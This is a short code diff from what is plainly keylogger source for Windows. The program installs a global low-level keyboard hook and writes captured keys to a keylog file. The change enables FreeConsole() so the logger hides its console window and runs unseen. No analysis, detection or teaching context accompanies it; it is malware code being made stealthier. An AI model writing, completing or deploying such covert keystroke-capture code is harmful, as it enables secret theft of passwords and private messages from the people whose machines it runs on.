@@ -99,7 +99,7 @@ int main() {
     bool bRet;
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
     createFile(_KEYLOG_FILENAME_, true);
-    // FreeConsole();
+    FreeConsole();
     while ((bRet = GetMessage( &msg, NULL, 0, 0)) != 0){
             TranslateMessage(&msg);
             DispatchMessage(&msg);
